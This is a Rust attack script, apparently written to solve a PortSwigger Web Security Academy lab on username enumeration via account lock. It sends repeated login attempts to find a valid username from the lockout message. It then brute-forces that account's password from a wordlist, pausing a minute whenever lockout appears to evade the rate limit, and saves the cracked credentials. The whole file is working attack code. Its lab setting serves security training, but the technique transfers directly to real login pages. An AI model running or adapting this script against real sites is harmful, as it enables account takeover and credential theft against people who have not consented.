/*********************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 28/8/2023
*
* Lab: Username enumeration via account lock
*
* Steps: 1. Try all users multiple times until on account is locked
*        2. Brute force password of that valid username
*        3. Wait 1 minute every 3 password tries to bypass blocking
*
* NOTE: this script is big because I add extra functionality to it
*
**********************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use atomic_counter::{self, RelaxedCounter};
use lazy_static::lazy_static;
use rayon::{
    current_thread_index,
    prelude::{IntoParallelRefIterator, ParallelIterator},
    ThreadPool,
};
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    io::{self, Write},
    ops::Add,
    process,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc, Mutex,
    },
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Global variables
*******************/
lazy_static! {
    static ref VALID_USER: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref VALID_PASSWORD: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref FAILED_USERS: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    static ref FAILED_PASSWORDS: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    static ref USERS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref FAILED_USERS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref FAILED_PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
    static ref REQUEST_COUNTER: AtomicUsize = AtomicUsize::new(0);
}

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a5c00df048cb8d2817549c300710087.web-security-academy.net/login";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // read users to one big string
    // change the path to your usrename list
    let usernames_big_string = fs::read_to_string("/home/ahmed/users").unwrap();

    // split the big string to a list of usernames
    // change the separator to \r\n if you are still a windows user
    let usernames = usernames_big_string.split("\n").collect();

    // read passwords to one big string
    // change the path to your password list
    let passwords_big_string = fs::read_to_string("/home/ahmed/passwords").unwrap();

    // split the big string to a list of passwords
    // change the separator to \r\n if you are still a windows user
    let passwords = passwords_big_string.split("\n").collect();

    // capture the time before enumeration
    let start_time = time::Instant::now();

    // start enumeration
    // 8 is the number of threads, you can chagne this
    enum_usernames(start_time, url, &client, usernames, 8);

    // if a valid username is found
    if VALID_USER.lock().unwrap().len() != 0 {
        // start brute force his password
        // 1 is the number of threads, you can change this
        brute_force_password(
            start_time,
            url,
            &client,
            passwords,
            VALID_USER.lock().unwrap().as_str(),
            1,
        );

        // if a valid password is found
        if VALID_PASSWORD.lock().unwrap().len() != 0 {
            print_valid_credentials();
        } else {
            println!("\n{}", "[!] Couldn't find valid password".red());
        }
    } else {
        println!("\n{}", "[!] Couldn't find valid username".red());
    }

    // print some useful information to the terminal
    print_finish_message(start_time);

    // some request will be failed due to unknow reseaon
    // print them after you finish to try them latere
    print_failed_requests();

    // save results  to a file in the current working directory. you can change this name to what you want
    save_results(start_time, "results");
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .timeout(Duration::from_secs(5))
        .redirect(Policy::none())
        .build()
        .unwrap()
}

/***********************************************************************
* Function used to enumerate usernames
* Parameters:
    - Instant:   to ouptut an updated elapsed time to the terminal
    - URL: the URL of the lab
    - client: the client we build using the build_client() function
    - usernames: the list of gathered usernames
    - threads: the number of threads you want the enumeration to run in
************************************************************************/
fn enum_usernames(
    start_time: Instant,
    url: &str,
    client: &Client,
    usernames: Vec<&str>,
    threads: usize,
) {
    println!("[#] Enumerate usernames..");
    // how many users will be tried in each thread
    let chunk_per_thread = usernames.len() / threads;

    // split the whole list to sublist to run each one in a thread
    let usernames_chunks: Vec<_> = usernames.chunks(chunk_per_thread).collect();

    // the pattern to search for in the response
    let regex = Regex::new("You have made too many incorrect login attempts").unwrap();

    // run every sublist in a thread
    usernames_chunks.par_iter().for_each(|mini_list| {
        // get the total count of the usernamse
        let total_counts = usernames.iter().count();

        for x in 0..4 {
            println!(
                "\n{} {} {}..",
                "Try number".white().bold(),
                x.to_string().blue().bold(),
                "of all users".white().bold()
            );

            // iterate over every sublist in its corresponding thread
            for (index, user) in mini_list.iter().enumerate() {
                // iterate only if no valid user is found
                if VALID_USER.lock().unwrap().len() == 0 {
                    // get number of succeeded requests
                    let success_counter = USERS_COUNTER.fetch_add(0, Ordering::Relaxed);

                    // get number of failed requests
                    let fail_counter = FAILED_USERS_COUNTER.fetch_add(0, Ordering::Relaxed);

                    // calcualte the elapsed time
                    let elapsed_time = start_time.elapsed().as_secs() / 60;

                    // print the progress based on the updated informations
                    print_progress(
                        elapsed_time,
                        fail_counter,
                        success_counter,
                        total_counts,
                        user,
                    );

                    // the data sent in the POST login request
                    let data =
                        HashMap::from([("username", user), ("password", &"not important now")]);

                    // try to login
                    let mut login = client.post(url).form(&data).send();

                    // check if the request was sent successfully
                    if let Ok(res) = login {
                        // add 1 to the succeeded counter
                        USERS_COUNTER.fetch_add(1, Ordering::Relaxed);

                        // get the body of the response
                        let body = &res.text().unwrap();

                        // search for the pattern
                        let pattern_existance = regex.find(body);

                        // if the patttern doesn't exist
                        if pattern_existance.is_some() {
                            // change this global varaible to the valid user
                            // this is the thread-safe operation using mutexes
                            VALID_USER.lock().unwrap().push_str(user);
                        }
                    } else {
                        // if the request faild for unknown reason try to send it again
                        login = client.post(url).form(&data).send();
                        if let Ok(res) = login {
                            USERS_COUNTER.fetch_add(1, Ordering::Relaxed);
                            let body = &res.text().unwrap();
                            let pattern_existance = regex.find(body);
                            if pattern_existance.is_some() {
                                VALID_USER.lock().unwrap().push_str(user);
                            }
                        } else {
                            // if the second try to send the request also faild
                            FAILED_USERS_COUNTER.fetch_add(1, Ordering::Relaxed); // add 1 to failed counter

                            // save this user to a list to try it later
                            FAILED_USERS.lock().unwrap().push(user.to_string());
                        }
                    }
                } else {
                    return; // if a valid username is found, this whill cause all threads to be terminated
                }
            }
        }
    });
}

/***********************************************************************
* Function used to brute force passowrd
* Parameters:
    - Instant: to ouptut an updated elapsed time to the terminal
    - URL: the URL of the lab
    - client: the client we build using the build_client() function
    - passwords: the list of gathered usernames
    - valid user: the valid user to brute force his password
    - threads: the number of threads you want the enumeration to run in
************************************************************************/
fn brute_force_password(
    start_time: Instant,
    url: &str,
    client: &Client,
    passwords: Vec<&str>,
    valid_user: &str,
    threads: usize,
) {
    println!("");
    println!(
        "{}: {}",
        "✅ Valid user".white().bold(),
        valid_user.green().bold()
    );
    println!("\n[#] Brute forcing password..");
    // how many passwords will be tried in each thread
    let chunk_per_thread = passwords.len() / threads;

    // split the whole list to sublist to run each one in a thread
    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect();

    // the pattern to search for in the response
    let regex = Regex::new("You have made too many incorrect login attempts").unwrap();

    // run every sublist in a thread
    passwords_chunks.par_iter().for_each(|mini_list| {
        // total number of passwords that will be tried
        let total_counts = passwords.iter().count();

        // iterate over every sublist in its corresponing thread
        for (index, password) in mini_list.iter().enumerate() {
            // iterate only if no valid password is found
            if VALID_PASSWORD.lock().unwrap().len() == 0 {
                // update the success counter to output in the terminal
                let success_counter = PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);

                // update the failed counter to output in the terminal
                let fail_counter = FAILED_PASSWORDS_COUNTER.fetch_add(0, Ordering::Relaxed);

                // calculate the elapsed time
                let elapsed_time = start_time.elapsed().as_secs() / 60;

                // print the updated information to the terminal
                print_progress(
                    elapsed_time,
                    fail_counter,
                    success_counter,
                    total_counts,
                    password,
                );

                // the POST date to submit
                let data = HashMap::from([("username", valid_user), ("password", password)]);

                // try to login
                let mut login = client.post(url).form(&data).send();

                // if login is successful
                if let Ok(res) = login {
                    // get the status code of the response
                    let status_code = res.status().as_u16();

                    // get the body of the response
                    let body = &res.text().unwrap();
                    // search for the pattern
                    let pattern_existance = regex.find(body);

                    // if the pattern is found
                    if pattern_existance.is_some() {
                        println!("\n{}", "Waiting 1 minute..".yellow().bold());

                        // wait 1 minute
                        thread::sleep(Duration::from_secs(60));
                    }

                    // make a login request
                    login = client.post(url).form(&data).send();

                    // if the request is successful
                    if let Ok(res) = login {
                        // if the password is true
                        if res.status().as_u16() == 302 {
                            // update the global variable to the valid password
                            // this is a thread-safe operation using mutexes
                            VALID_PASSWORD.lock().unwrap().push_str(password)
                        }
                    }
                } else {
                    // if the request faild for unknown reason try to send it again
                    login = client.post(url).form(&data).send();
                    if let Ok(res) = login {
                        // get the status code of the response
                        let status_code = res.status().as_u16();

                        // get the body of the response
                        let body = &res.text().unwrap();

                        // search for the pattern
                        let pattern_existance = regex.find(body);

                        // if pattern is found
                        if pattern_existance.is_some() {
                            println!("\n{}", "Waiting 1 minute..".yellow().bold());

                            // wait 1 minute
                            thread::sleep(Duration::from_secs(60));
                        }

                        // make a login request
                        login = client.post(url).form(&data).send();

                        // if request is successful
                        if let Ok(res) = login {
                            // if the password is true
                            if res.status().as_u16() == 302 {
                                // update the global variable to the valid password
                                // this is a thread-safe operation using mutexes
                                VALID_PASSWORD.lock().unwrap().push_str(password)
                            }
                        }
                    } else {
                        // if the repeated request also failed,
                        // upate the counter and save the password to try it later
                        FAILED_PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed);
                        FAILED_PASSWORDS.lock().unwrap().push(password.to_string());
                    }
                }
            } else {
                return;
            }
        }
    });
}

/*************************************
* Function used print the update info
* to the terminal in a nice format
**************************************/
#[inline(always)]
fn print_progress(
    elapsed_time: u64,
    fail_counter: usize,
    success_counter: usize,
    total_counts: usize,
    text: &str,
) {
    print!(
        "\r{}: {:3} minutes || {}: {:3} || {} ({}/{}): {:50}",
        "Elapsed".yellow().bold(),
        elapsed_time,
        "Failed".red().bold(),
        fail_counter,
        "Trying".white().bold(),
        success_counter,
        total_counts,
        text.blue().bold()
    );
    io::stdout().flush().unwrap();
}

/********************************************************
* Function used to print the valid username and password
*********************************************************/
fn print_valid_credentials() {
    println!(
        "\n{}: username: {}, password: {}",
        "✅ Login successfully".white(),
        VALID_USER.lock().unwrap().green().bold(),
        VALID_PASSWORD.lock().unwrap().green().bold()
    );
}
/********************************************************
* Function used to print finish time
*********************************************************/
#[inline(always)]
fn print_finish_message(start_time: Instant) {
    println!(
        "\n{}: {:?} minutes",
        "✅ Finished in".green().bold(),
        start_time.elapsed().as_secs() / 60
    );
}
/****************************************************
* Function used print failed usernames and password
* that we tried 2 times earlier and also failed
*****************************************************/
#[inline(always)]
fn print_failed_requests() {
    let failed_users = FAILED_USERS.lock().unwrap();
    println!(
        "\n\n{}: {} \n{}: {:?}",
        "[!] Failed users count".red().bold(),
        failed_users.len().to_string().yellow().bold(),
        "[!] Failed users".red().bold(),
        failed_users
    );
    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
    println!(
        "\n\n{}: {} \n{}: {:?}",
        "[!] Failed password count".red().bold(),
        failed_passwords.len().to_string().yellow().bold(),
        "[!] Failed password".red().bold(),
        failed_passwords
    )
}

/*********************************************
* Function used to save results to a txt file
**********************************************/
fn save_results(start_time: Instant, file_name: &str) {
    let failed_users = FAILED_USERS.lock().unwrap();
    let failed_passwords = FAILED_PASSWORDS.lock().unwrap();
    let valid_user = VALID_USER.lock().unwrap();
    let valid_pass = VALID_PASSWORD.lock().unwrap();
    let to_save = format!(
        "✅ Finished in: {elapsed_time:?} minutes \n\n\
    Username: {user}, Password: {pass} \n\n\
    [!] Failed users count: {fusers_count} \n\
    [!] Failed users: {fusers:?} \n\n\
    [!] Failed passwords count: {fpasswords_count} \n\
    [!] Failed passwords: {fpasswords:?} \n\n",
        elapsed_time = start_time.elapsed().as_secs() / 60,
        fusers_count = failed_users.len(),
        fusers = failed_users,
        fpasswords = failed_passwords,
        fpasswords_count = failed_passwords.len(),
        user = valid_user,
        pass = valid_pass
    );
    let new_file = fs::File::create(file_name);
    if let Ok(mut file_created) = new_file {
        write!(file_created, "{}", to_save);
        println!(
            "\n{}: {}",
            "Restults was saved to".yellow().bold(),
            file_name.green().bold()
        )
    } else {
        println!("\n{}", "[!] Couldn't create new file to save results".red());
    }
}
